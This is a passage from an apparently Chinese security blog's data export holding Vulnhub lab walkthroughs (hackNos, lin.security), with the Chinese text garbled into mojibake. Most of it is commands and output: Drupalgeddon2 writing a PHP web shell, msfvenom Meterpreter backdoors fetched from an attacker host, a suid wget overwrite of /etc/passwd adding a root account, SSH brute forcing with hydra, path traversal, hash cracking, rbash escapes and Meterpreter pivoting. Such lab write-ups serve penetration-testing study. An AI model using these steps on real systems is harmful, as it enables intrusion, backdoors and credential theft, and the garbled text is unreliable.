&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device &#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine &#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1 &#x2F;usr&#x2F;bin&#x2F;pkexec &#x2F;usr&#x2F;bin&#x2F;newgidmap &#x2F;usr&#x2F;bin&#x2F;gpasswd &#x2F;usr&#x2F;bin&#x2F;sudo &#x2F;usr&#x2F;bin&#x2F;newgrp &#x2F;usr&#x2F;bin&#x2F;newuidmap &#x2F;usr&#x2F;bin&#x2F;wget &#x2F;usr&#x2F;bin&#x2F;passwd &#x2F;usr&#x2F;bin&#x2F;chsh &#x2F;usr&#x2F;bin&#x2F;chfn &#x2F;bin&#x2F;ping6 &#x2F;bin&#x2F;umount &#x2F;bin&#x2F;ntfs-3g &#x2F;bin&#x2F;mount &#x2F;bin&#x2F;ping &#x2F;bin&#x2F;su &#x2F;bin&#x2F;fusermount å¯ä»¥ç”¨wgetå‘½ä»¤ææƒ å¯¹/etc/passwdæ–‡ä»¶è¿›è¡Œé—´æ¥ä¿®æ”¹ 12345hackNos: file_download &#x2F;etc&#x2F;passwd passwdperl -le &#39;print crypt(&quot;hackforfun&quot;,&quot;addedsalt&quot;)&#39; adWo3GnVnKzuUecho &#39;test:adWo3GnVnKzuU:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; passwdhackNos: wget http:&#x2F;&#x2F;192.168.31.10:8000&#x2F;passwd -O &#x2F;etc&#x2F;passwd åœ¨bashä¸­åˆ‡æ¢è´¦æˆ· 1234su testhackforfunid uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) åœ¨MeterpreteræŸ¥çœ‹A1çš„ç½‘ç»œä¿¡æ¯ 1234567891011121314151617181920212223242526272829303132333435363738ifconfigInterface 1&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Name : loHardware MAC : 00:00:00:00:00:00MTU : 65536Flags : UP,LOOPBACKIPv4 Address : 127.0.0.1IPv4 Netmask : 255.0.0.0IPv6 Address : ::1IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::Interface 2&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Name : enp0s3Hardware MAC : 08:00:27:7d:4c:83MTU : 1500Flags : UP,BROADCAST,MULTICASTIPv4 Address : 192.168.31.132IPv4 Netmask : 255.255.255.0IPv6 Address : fe80::a00:27ff:fe7d:4c83IPv6 Netmask : ffff:ffff:ffff:ffff::IPv6 Address : fe80::a00:27ff:fe7d:4c83IPv6 Netmask : ffff:ffff:ffff:ffff::Interface 3&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Name : enp0s8Hardware MAC : 08:00:27:65:bd:8bMTU : 1500Flags : UP,BROADCAST,MULTICASTIPv4 Address : 192.168.56.109IPv4 Netmask : 255.255.255.0IPv6 Address : fe80::a00:27ff:fe65:bd8bIPv6 Netmask : ffff:ffff:ffff:ffff:: å‘ç°192.168.56.0ç½‘æ®µ åœ¨Meterpreterä¸­æ·»åŠ è·¯ç”± 123456789run autoroute -s 192.168.56.0&#x2F;24run autoroute -pActive Routing Table&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Subnet Netmask Gateway ------ ------- ------- 192.168.56.0 255.255.255.0 Session 1 åœ¨MSFä¸­æ‰«æå†…ç½‘ç½‘æ®µ 123456use auxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep set RHOSTS 192.168.56.0&#x2F;24set THREADS 20run[+] 192.168.56.103 appears to be up (CADMUS COMPUTER SYSTEMS) å‘ç°å†…ç½‘æœºå™¨A2 æ·»åŠ sockä»£ç† 123use auxiliary&#x2F;server&#x2F;socks4aset srvport 9999run ä¿®æ”¹Proxychainæ–‡ä»¶ 12vim &#x2F;etc&#x2F;proxychains.conf socks4 192.168.31.10 9999 lin.security ç«¯å£æ‰«æ proxychainsä»£ç†Nmapå¯¹A2è¿›è¡Œç«¯å£æ‰«æ proxychains nmap -sT -Pn -v -T5 -A 192.168.56.103 123456789101112131415161718192021222324252627282930313233343536373839404142434445Nmap scan report for 192.168.56.103Host is up (0.0048s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 7a:9b:b9:32:6f:95:77:10:c0:a0:80:35:34:b1:c0:00 (RSA)| 256 24:0c:7a:82:78:18:2d:66:46:3b:1a:36:22:06:e1:a1 (ECDSA)|_ 256 b9:15:59:78:85:78:9e:a5:e6:16:f6:cf:96:2d:1d:36 (ED25519)111&#x2F;tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port&#x2F;proto service| 100000 2,3,4 111&#x2F;tcp rpcbind| 100000 2,3,4 111&#x2F;udp rpcbind| 100000 3,4 111&#x2F;tcp6 rpcbind| 100000 3,4 111&#x2F;udp6 rpcbind| 100003 3 2049&#x2F;udp nfs| 100003 3 2049&#x2F;udp6 nfs| 100003 3,4 2049&#x2F;tcp nfs| 100003 3,4 2049&#x2F;tcp6 nfs| 100005 1,2,3 36117&#x2F;tcp mountd| 100005 1,2,3 36311&#x2F;udp mountd| 100005 1,2,3 50621&#x2F;tcp6 mountd| 100005 1,2,3 58468&#x2F;udp6 mountd| 100021 1,3,4 36071&#x2F;udp nlockmgr| 100021 1,3,4 38529&#x2F;tcp6 nlockmgr| 100021 1,3,4 41451&#x2F;udp6 nlockmgr| 100021 1,3,4 41509&#x2F;tcp nlockmgr| 100227 3 2049&#x2F;tcp nfs_acl| 100227 3 2049&#x2F;tcp6 nfs_acl| 100227 3 2049&#x2F;udp nfs_acl|_ 100227 3 2049&#x2F;udp6 nfs_acl2049&#x2F;tcp open nfs_acl 3 (RPC #100227)Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernelNSE: Script Post-scanning.Initiating NSE at 04:02Completed NSE at 04:02, 0.00s elapsedInitiating NSE at 04:02Completed NSE at 04:02, 0.00s elapsedInitiating NSE at 04:02Completed NSE at 04:02, 0.00s elapsedRead data files from: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;share&#x2F;nmapService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 7.88 seconds å¼€æ”¾sshæœåŠ¡ä¸nfsæœåŠ¡ æ¼æ´åˆ©ç”¨ NFSç›®å½•æŒ‚è½½ å°è¯•åœ¨A1ä¸ŠæŒ‚è½½A2çš„/home/peterç›®å½• 123456789101112apt-get install nfs-commonvim &#x2F;etc&#x2F;exports &#x2F;share1 *(sync,ro) 192.168.56.103(sync,rw)systemctl restart rpcbindsystemctl restart nfsshowmount -e 192.168.56.103 Export list for 192.168.56.103: &#x2F;home&#x2F;peter *mkdir &#x2F;mnt&#x2F;share1mount -t nfs 192.168.56.103:&#x2F;home&#x2F;peter &#x2F;mnt&#x2F;share1cd &#x2F;mnt&#x2F;share1ls æŒ‚è½½å¤±è´¥ RPCBind æœªæ‰¾åˆ°å¯ä»¥è·å–Shellçš„EXP SSH 123proxychains hydra -V -I -f -t 64 -L user -P pass ssh:&#x2F;&#x2F;192.168.56.103:22[22][ssh] host: 192.168.56.103 login: bob password: secret è·å–è´¦æˆ·â€œbobâ€ æƒé™æå‡ åœ¨A1ä¸Šç”¨SSHç™»å½•A2ï¼Œsudoææƒï¼Œå†™å…¥æ–°rootè´¦æˆ· 123456789101112ssh bob@192.168.56.103sudo -isecretperl -le &#39;print crypt(&quot;hackforfun&quot;,&quot;addedsalt&quot;)&#39; adWo3GnVnKzuUecho &#39;test:adWo3GnVnKzuU:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwdexitexitssh test@192.168.56.103hackforfununame -a Linux linsecurity 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU&#x2F;Linux æ„é€ Meterpreteråé—¨ç¨‹åº msfvenom -p linux/x64/meterpreter/bind_tcp RHOST=192.168.56.103 LPORT=2345 -e x86/shikata_ga_nai -i 11 -f elf &gt; msf2.elf å°†Meterpreteråé—¨ç¨‹åºä¸Šä¼ è‡³A2 proxychians scp msf2.elf test@192.168.56.103:/root/msf2.elf åœ¨A2ä¸Šè¿è¡Œåé—¨ç¨‹åº 12chmod +X msf2.elf.&#x2F;msf2.elf &amp; 12345use exploit&#x2F;multi&#x2F;handlerset payload linux&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcpset RHOST 192.168.56.103set LPORT 2345run æˆåŠŸè·å–Shell 12345678910111213141516171819202122232425262728293031323334353637383940414243444546ifconfigInterface 1&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Name : loHardware MAC : 00:00:00:00:00:00MTU : 65536Flags : UP,LOOPBACKIPv4 Address : 127.0.0.1IPv4 Netmask : 255.0.0.0IPv6 Address : ::1IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::Interface 2&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Name : enp0s3Hardware MAC : 08:00:27:d8:9f:d6MTU : 1500Flags : UP,BROADCAST,MULTICASTIPv4 Address : 192.168.56.103IPv4 Netmask : 255.255.255.0IPv6 Address : fe80::a00:27ff:fed8:9fd6IPv6 Netmask : ffff:ffff:ffff:ffff::Interface 3&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Name : enp0s8Hardware MAC : 08:00:27:be:f1:93MTU : 1500Flags : UP,BROADCAST,MULTICASTIPv4 Address : 192.168.156.5IPv4 Netmask : 255.255.255.0IPv6 Address : fe80::a00:27ff:febe:f193IPv6 Netmask : ffff:ffff:ffff:ffff::Interface 4&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Name : docker0Hardware MAC : 02:42:f4:43:ba:1bMTU : 1500Flags : UP,BROADCAST,MULTICASTIPv4 Address : 172.17.0.1IPv4 Netmask : 255.255.0.0 å‘ç°192.168.156.0ç½‘æ®µ åœ¨Meterpreterä¸­æ·»åŠ è·¯ç”± 12345678910run autoroute -s 192.168.156.0&#x2F;24run autoroute -pActive Routing Table&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Subnet Netmask Gateway ------ ------- ------- 192.168.56.0 255.255.255.0 Session 1 192.168.156.0 255.255.255.0 Session 2 åœ¨MSFä¸­æ‰«æå†…ç½‘ç½‘æ®µ 123456use auxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep set RHOSTS 192.168.156.0&#x2F;24set THREADS 20run[+] 192.168.156.6 appears to be up (CADMUS COMPUTER SYSTEMS) å‘ç°å†…ç½‘æœºå™¨A3 hackNos-2 ç«¯å£æ‰«æ proxychains nmap -sT -Pn -v -T5 -A 192.168.156.6 12345678910111213141516Nmap scan report for 192.168.156.6Host is up (0.00095s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 94:36:4e:71:6a:83:e2:c1:1e:a9:52:64:45:f6:29:80 (RSA)| 256 b4:ce:5a:c3:3f:40:52:a6:ef:dc:d8:29:f3:2c:b5:d1 (ECDSA)|_ 256 09:6c:17:a1:a3:b4:c7:78:b9:ad:ec:de:8f:64:b1:7b (ED25519)80&#x2F;tcp open http Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_ Supported Methods: GET POST OPTIONS HEAD|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksMAC Address: 08:00:27:D8:5B:21 (Oracle VirtualBox virtual NIC)Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%) Webè·¯å¾„æšä¸¾ dirb http://192.168.156.6 -w 123456789---- Scanning URL: http:&#x2F;&#x2F;192.168.156.6&#x2F; ----+ http:&#x2F;&#x2F;192.168.156.6&#x2F;index.html (CODE:200|SIZE:10918) + http:&#x2F;&#x2F;192.168.156.6&#x2F;server-status (CODE:403|SIZE:278) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F; ---- Entering directory: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F; ----+ http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;index.php (CODE:301|SIZE:0) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-admin&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-content&#x2F; æ¼æ´åˆ©ç”¨ ä½¿ç”¨wpscané’ˆå¯¹wordpressè¿›è¡Œæ‰«æ proxychains wpscan --url http://192.168.156.6/tsweb/ --enumerate u 123456789[i] User(s) Identified:[+] user | Found By: Rss Generator (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) å‘ç°å­˜åœ¨ç”¨æˆ·user 12345678910111213141516$ wpscan --url http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F; --enumerate p[i] Plugin(s) Identified:[+] gracemedia-media-player | Location: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F; | Latest Version: 1.0 (up to date) | Last Updated: 2013-07-21T15:09:00.000Z | | Found By: Urls In Homepage (Passive Detection) | | Version: 1.0 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;readme.txt å­˜åœ¨æ’ä»¶gracemedia-media-player æœç´¢å¾—åˆ°ç›¸å…³EXP wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&amp;cfg=../../../../../../../../../../etc/passwd å¾—åˆ°ä¸¤æ¡é‡è¦ä¿¡æ¯ rohit:x:1000:1000:hackNos:/home/rohit:/bin/bash flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash å¯ä»¥ç ´è§£flagè´¦æˆ·çš„å¯†ç  æƒé™æå‡ ä½¿ç”¨johnè¿›è¡Œå­—å…¸çˆ†ç ´ 1234echo &#39;$1$flag$vqjCxzjtRc7PofLYS2lWf&#x2F;&#39; &gt; passwdjohn --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt --format&#x3D;md5crypt-long passwdjohn --show passwd topsecret ä½¿ç”¨flagè´¦æˆ·ç™»å…¥ 12proxychains ssh flag@192.168.156.6topsecret è€Œç™»å…¥æ—¶ä½¿ç”¨çš„æ˜¯rbashï¼Œåœ¨è¿›è¡Œæ“ä½œæ—¶ä¼šå¾ˆä¸æ–¹ä¾¿ï¼Œéœ€è¦åˆ‡æ¢åˆ°bash 123python -c &#39;import os; os.system(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;perl -e &#39;exec &quot;&#x2F;bin&#x2F;bash&quot;;&#39;awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39; ä»¥ä¸Šä¸‰æ¡å‘½ä»¤å‡å¯ å°è¯•ç›´æ¥sudoææƒï¼Œå¤±è´¥ å°è¯•åœ¨ç›®æ ‡æœåŠ¡å™¨å†…æœç´¢ä¿¡æ¯ å‘ç°æ–‡ä»¶/var/backups/passbkp/md5-hash 12cat &#x2F;var&#x2F;backups&#x2F;passbkp&#x2F;md5-hash $1$rohit$01Dl0NQKtgfeL08fGrggi0 å¾—åˆ°rohitè´¦æˆ·çš„å¯†ç  ä½¿ç”¨johnç ´è§£å¯†ç  1234echo &#39;$1$rohit$01Dl0NQKtgfeL08fGrggi0&#39; &gt; passwd2john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt --format&#x3D;md5crypt-long passwd2john --show passwd2 !%hack41 åˆ‡æ¢åˆ°rohitè´¦æˆ·ï¼Œå¹¶å°è¯•sudoææƒ 123456su rohit!%hack41sudo -i!%hack41id uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) å†…ç½‘æ¸—é€çš„å‡ ä¸ªæ€è·¯ proxychains+meterpreter åœ¨è·å–æœºå™¨çš„æƒé™ä¹‹åï¼Œä¸Šä¼ meterpreteråé—¨ï¼Œç„¶åå»ºç«‹è·¯ç”±ï¼Œå†å€Ÿä»¥æœ¬æœºçš„socksä»£ç†æœåŠ¡æ¥è¿›è¡Œæµé‡è½¬å‘ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„å…æ€ï¼Œä»¥åŠæ§åˆ¶çš„æŒç»­åŒ–ã€‚meterpreterçš„ä¾¿åˆ©ä¹‹å¤„åœ¨äºï¼Œå¯ä»¥å»ºç«‹è·¯ç”±ç„¶åä¾¿äºMSFå¯¹äºå†…ç½‘çš„ç›´æ¥æ¸—é€ï¼Œä»¥åŠé™„å¸¦çš„è®¸å¤šä½¿ç”¨åŠŸèƒ½ã€‚ proxychains+earthworm ä¸meterpreterç±»ä¼¼ï¼Œä½†æ˜¯åªæ˜¯ä¸Šä¼ ä¸€ä¸ªæµé‡è½¬å‘å·¥å…·è€Œä¸æ˜¯åé—¨ç¨‹åºï¼Œæ‰€ä»¥å¯èƒ½ä¸å¤ªä¼šéœ€è¦è€ƒè™‘åˆ°å…æ€è¿™ä¸€æ–¹é¢ï¼Œä½†æ˜¯å¼€å¯ä»£ç†æœåŠ¡çš„è¯è²Œä¼¼è¿˜æ˜¯æœ‰ç‚¹å±é™©çš„ã€‚è€Œä¸”å¦‚æœè¿›è¡Œå¤šå±‚æ¸—é€çš„è¯ï¼Œå¯èƒ½éœ€è¦ç›¸åº”çš„å¤šæ­å‡ æ¡ä»£ç†è·¯çº¿ï¼Œåœ¨æ“ä½œæ—¶å¯èƒ½éœ€è¦è®°ä¸‹ç›¸åº”çš„ä¿¡æ¯ã€‚ nmapè¿›è¡Œæ‰«ææœ€å¥½å¸¦ä¸Š-næ¥å–æ¶ˆæ‰dnsè§£æ","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"Vulnhub","slug":"Vulnhub","permalink":"https://yoloyolo.top/tags/Vulnhub/"}]},{"title":"Vulnhub_Walkthrough_Set","slug":"Vulnhub-Walkthrough-Set","date":"2023-02-08T13:05:32.000Z","updated":"2023-02-08T15:50:27.000Z","comments":true,"path":"2023/02/08/Vulnhub-Walkthrough-Set/","link":"","permalink":"https://yoloyolo.top/2023/02/08/Vulnhub-Walkthrough-Set/","excerpt":"è¿Ÿæ¥çš„æ–‡ç« ","text":"è¿Ÿæ¥çš„æ–‡ç«  Os-hackNos-1 2019/11/30 22:06:46 ç«¯å£æ‰«æ nmap -sV -Pn -v -T5 -A 192.168.56.104 123456789101112PORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 a5:a5:17:70:4d:be:48:ad:ba:64:c1:07:a0:55:03:ea (RSA)| 256 f2:ce:42:1c:04:b8:99:53:95:42:ab:89:22:66:9e:db (ECDSA)|_ 256 4a:7d:15:65:83:af:82:a3:12:02:21:1c:23:49:fb:e9 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.18 ((Ubuntu))| http-methods: |_ Supported Methods: POST OPTIONS GET HEAD|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksAggressive OS guesses: Actiontec MI424WR-GEN3I WAP (99%), DD-WRT v24-sp2 (Linux 2.4.37) (98%), Linux 3.2 (98%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (96%), Linux 4.4 (96%), Microsoft Windows XP SP3 (96%), BlueArc Titan 2100 NAS device (91%) Webè·¯å¾„æšä¸¾ dirb http://192.168.56.104 -w 1234567891011121314151617---- Scanning URL: http:&#x2F;&#x2F;192.168.56.104&#x2F; ----&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F; + http:&#x2F;&#x2F;192.168.56.104&#x2F;index.html (CODE:200|SIZE:11321) + http:&#x2F;&#x2F;192.168.56.104&#x2F;server-status (CODE:403|SIZE:279) ---- Entering directory: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F; ----&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;includes&#x2F; + http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;index.php (CODE:200|SIZE:7687) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;misc&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;modules&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;profiles&#x2F; + http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;robots.txt (CODE:200|SIZE:2189) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;scripts&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;sites&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;themes&#x2F; + http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;web.config (CODE:200|SIZE:2200) + http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;xmlrpc.php (CODE:200|SIZE:42) æ¼æ´åˆ©ç”¨ WebæœåŠ¡é‡‡ç”¨äº†Drupalæ¡†æ¶ æœç´¢å¾—çŸ¥Drupalæ¡†æ¶å­˜åœ¨RCEæ¼æ´ git clone https://github.com/dreadlocked/Drupalgeddon2.git å°è¯•å¯¹ç›®æ ‡ä½¿ç”¨Exploit ruby drupalgeddon2.rb http://192.168.56.104/drupal/ 12345678[*] Testing: Writing To Web Root (.&#x2F;)[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php[+] Result : &lt;?php if( isset( $_REQUEST[&#39;c&#39;] ) ) &#123; system( $_REQUEST[&#39;c&#39;] . &#39; 2&gt;&amp;1&#39; ); &#125;[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!--------------------------------------------------------------------------------[i] Fake PHP shell: curl &#39;http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;shell.php&#39; -d &#39;c&#x3D;hostname&#39;hackNos&gt;&gt; iduid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data) æˆåŠŸè·å–WebShell æƒé™æå‡ æŸ¥çœ‹æœåŠ¡å™¨ç³»ç»Ÿç‰ˆæœ¬ 12uname -aLinux hackNos 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686 i686 i686 GNU&#x2F;Linux ä½¿ç”¨weevelyç¼–å†™WebShell 12weevely generate pass wee.phpmv wee.php wee åœ¨æœåŠ¡å™¨ä¸Šç”¨wgetä¸‹è½½WebShell 12wget http:&#x2F;&#x2F;192.168.56.102&#x2F;weemv wee wee.php è¿æ¥WebShell weevely http://192.168.56.104/drupal/wee.php pass ä½¿ç”¨MSFVenomç¼–å†™åé—¨ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=1234 -f elf &gt; msf.elf åœ¨æœåŠ¡å™¨ä¸Šç”¨WebShellä¸Šä¼ åé—¨ç¨‹åº 123456file_upload &#x2F;root&#x2F;software&#x2F;msf.elf &#x2F;var&#x2F;www&#x2F;html&#x2F;drupal&#x2F;msf.elfls -l msf.elf -rw-r--r-- 1 www-data www-data 250 Dec 2 18:37 msf.elfchmod 755 msf.elf -rwxr-xr-x 1 www-data www-data 250 Dec 2 18:37 msf.elfhackNos: .&#x2F;msf.elf &amp; ä½¿ç”¨MSFè¿›è¡Œæ¸—é€æ”»å‡» 12345use exploit&#x2F;multi&#x2F;handlerset payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.56.102set LPORT 1234run å°†meterpreter shellè½¬ä¸ºbash 12shellpython3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; æŸ¥çœ‹å…·æœ‰suidæƒé™ä¸”å±äºrootç”¨æˆ·çš„å‘½ä»¤ 12345678910111213141516171819202122232425find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper &#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign &#x2F;usr&#x2F;lib&#x2F;i386-linux-gnu&#x2F;lxc&#x2F;lxc-user-nic &#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device &#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine &#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1 &#x2F;usr&#x2F;bin&#x2F;pkexec &#x2F;usr&#x2F;bin&#x2F;newgidmap &#x2F;usr&#x2F;bin&#x2F;gpasswd &#x2F;usr&#x2F;bin&#x2F;sudo &#x2F;usr&#x2F;bin&#x2F;newgrp &#x2F;usr&#x2F;bin&#x2F;newuidmap &#x2F;usr&#x2F;bin&#x2F;wget &#x2F;usr&#x2F;bin&#x2F;passwd &#x2F;usr&#x2F;bin&#x2F;chsh &#x2F;usr&#x2F;bin&#x2F;chfn &#x2F;bin&#x2F;ping6 &#x2F;bin&#x2F;umount &#x2F;bin&#x2F;ntfs-3g &#x2F;bin&#x2F;mount &#x2F;bin&#x2F;ping &#x2F;bin&#x2F;su &#x2F;bin&#x2F;fusermount å¯ä»¥ç”¨wgetå‘½ä»¤ææƒ å¯¹/etc/passwdæ–‡ä»¶è¿›è¡Œé—´æ¥ä¿®æ”¹ 12345hackNos: file_download &#x2F;etc&#x2F;passwd passwdperl -le &#39;print crypt(&quot;happy_hacker&quot;,&quot;addedsalt&quot;)&#39; ad3sa&#x2F;MFODb7kecho &#39;test:ad3sa&#x2F;MFODb7k:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; passwdhackNos: wget http:&#x2F;&#x2F;192.168.56.102&#x2F;passwd -O &#x2F;etc&#x2F;passwd åœ¨bashä¸­åˆ‡æ¢è´¦æˆ· 1234su testhappy_hackerid uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) å¦ä¸€ä¸ªæ€è·¯ 1234567snap --versionsnap 2.34.2ubuntu0.1 snapd 2.34.2ubuntu0.1 series 16 ubuntu 16.04 kernel 4.4.0-142-generic CVE-2019-7304ä¸€æŠŠæ¢­ è¡¥å……ä¸€äº›ç»†èŠ‚ ç”±äºKaliåœ¨VMwareä¸‹è€ŒUbuntuåœ¨VBoxï¼Œå¯¼è‡´ç½‘ç»œæœ‰äº›é—®é¢˜ Kaliå¯ä»¥è¿é€šUbuntuä½†æ˜¯åä¹‹ä¸è¡Œ 